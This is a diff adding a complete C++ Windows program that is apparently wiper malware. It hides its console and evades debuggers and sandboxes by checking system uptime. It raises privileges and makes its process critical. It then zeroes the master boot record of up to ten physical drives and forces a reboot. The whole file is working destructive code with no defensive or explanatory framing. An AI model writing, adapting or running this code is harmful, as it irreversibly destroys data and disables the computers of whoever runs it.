@@ -1,0 +1,99 @@
+#include <windows.h>
+#include <winioctl.h>
+#include <iostream>
+
+#pragma comment(lib, "ntdll.lib")
+
+BOOL EnablePrivilege(LPCSTR privilege) {
+    HANDLE tokenHandle;
+    TOKEN_PRIVILEGES tokenPrivileges;
+    LUID luid;
+    
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
+        return FALSE;
+    
+    if (!LookupPrivilegeValueA(NULL, privilege, &luid))
+        return FALSE;
+    
+    tokenPrivileges.PrivilegeCount = 1;
+    tokenPrivileges.Privileges[0].Luid = luid;
+    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    
+    AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL);
+    CloseHandle(tokenHandle);
+    return TRUE;
+}
+
+BOOL DestroyMBR(LPCSTR drivePath) {
+    HANDLE hDrive;
+    DWORD bytesReturned, bytesWritten;
+    BYTE mbr[512];
+    
+    hDrive = CreateFileA(drivePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    
+    if (hDrive == INVALID_HANDLE_VALUE) return FALSE;
+    
+    DeviceIoControl(hDrive, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &bytesReturned, NULL);
+    DeviceIoControl(hDrive, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &bytesReturned, NULL);
+    
+    for (int i = 0; i < 512; i++) mbr[i] = 0x00;
+    
+    BOOL result = WriteFile(hDrive, mbr, 512, &bytesWritten, NULL);
+    
+    DeviceIoControl(hDrive, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &bytesReturned, NULL);
+    CloseHandle(hDrive);
+    return result;
+}
+
+BOOL DestroyAllMBRs() {
+    char drivePath[64];
+    BOOL success = FALSE;
+    
+    for (int i = 0; i < 10; i++) {
+        sprintf(drivePath, "\\\\.\\PhysicalDrive%d", i);
+        
+        HANDLE hDrive = CreateFileA(drivePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+        
+        if (hDrive != INVALID_HANDLE_VALUE) {
+            CloseHandle(hDrive);
+            if (DestroyMBR(drivePath)) success = TRUE;
+        }
+    }
+    
+    return success;
+}
+
+VOID ForceShutdown() {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tkp;
+    
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
+    
+    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN);
+}
+
+int main() {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
+    if (IsDebuggerPresent()) return 0;
+    if (GetTickCount() < 600000) return 0;
+    
+    EnablePrivilege("SeManageVolumePrivilege");
+    EnablePrivilege("SeBackupPrivilege");
+    EnablePrivilege("SeRestorePrivilege");
+    EnablePrivilege("SeDebugPrivilege");
+    EnablePrivilege("SeShutdownPrivilege");
+    
+    HANDLE hProcess = GetCurrentProcess();
+    ULONG isCritical = 1;
+    NtSetInformationProcess(hProcess, 29, &isCritical, sizeof(isCritical));
+    
+    DestroyAllMBRs();
+    ForceShutdown();
+    
+    return 0;
+}
